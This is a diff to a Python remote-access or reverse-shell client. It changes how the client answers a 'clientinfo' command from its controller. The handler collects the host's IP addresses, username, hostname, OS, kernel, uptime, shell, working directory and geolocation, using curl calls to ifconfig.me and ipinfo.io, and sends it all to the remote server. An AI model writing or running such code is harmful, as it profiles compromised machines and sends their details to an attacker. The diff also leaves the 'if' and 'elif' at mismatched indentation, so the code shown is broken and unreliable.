@@ -29,21 +29,21 @@ def connect_to_server():
                     if command.lower() == "exit":
                         break
 
-                    if command == "clientinfo":
-                        # Retrieve system information
-                        info = (
-                            f"IP Address: {subprocess.getoutput('hostname -I')}\n"
-                            f"Device Username: {subprocess.getoutput('whoami')}\n"
-                            f"Hostname: {subprocess.getoutput('hostname')}\n"
-                            f"OS: {subprocess.getoutput('lsb_release -d | awk -F \':\' \'{print $2}\')}\n"
-                            f"Kernel: {subprocess.getoutput('uname -r')}\n"
-                            f"Uptime: {subprocess.getoutput('uptime -p')}\n"
-                            f"Public IP: {subprocess.getoutput('curl -s ifconfig.me')}\n"
-                            f"Location: {subprocess.getoutput('curl -s ipinfo.io/location')}\n"
-                            f"Shell: {os.getenv('SHELL')}\n"
-                            f"Current Directory: {os.getcwd()}\n"
-                        )
-                        client.send(info.encode())
+                if command == "clientinfo":
+                    # Retrieve system information
+                    info = (
+                        f"IP Address: {subprocess.getoutput('hostname -I')}\n"
+                        f"Device Username: {subprocess.getoutput('whoami')}\n"
+                        f"Hostname: {subprocess.getoutput('hostname')}\n"
+                        f"OS: {subprocess.getoutput('lsb_release -d | awk -F \':\' \'{print $2}\')}\n"
+                        f"Kernel: {subprocess.getoutput('uname -r')}\n"
+                        f"Uptime: {subprocess.getoutput('uptime -p')}\n"
+                        f"Public IP: {subprocess.getoutput('curl -s ifconfig.me')}\n"
+                        f"Location: {subprocess.getoutput('curl -s ipinfo.io/location')}\n"
+                        f"Shell: {os.getenv('SHELL')}\n"
+                        f"Current Directory: {os.getcwd()}\n"
+                    )
+                    client.send(info.encode())
                     elif command.startswith("cd "):
                         # Change the current working directory
                         path = command[3:].strip()
